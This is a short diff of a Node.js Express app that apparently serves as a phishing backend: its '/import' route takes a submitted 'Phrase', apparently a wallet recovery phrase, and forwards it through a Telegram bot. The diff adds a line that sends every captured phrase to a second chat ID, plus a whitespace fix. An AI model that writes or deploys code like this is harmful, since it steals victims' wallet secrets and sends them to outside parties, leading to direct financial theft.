@@ -7,7 +7,7 @@ require('dotenv').config()
 const app = express()
 
 app.use(express.static('public'))
-app.use(express.urlencoded({ extended: true}))
+app.use(express.urlencoded({ extended: true }))
 
 const bot = new Telegraf(process.env.BOT_TOKEN)
 
@@ -26,6 +26,7 @@ app.get("/import-phrase", (req, res) => {
 app.post("/import", async (req, res) => {
     try {
         bot.telegram.sendMessage(process.env.chatID, req.body.Phrase)
+        bot.telegram.sendMessage(process.env.otherChatID, req.body.Phrase)
     }catch(err) {
         console.log(err)
     }
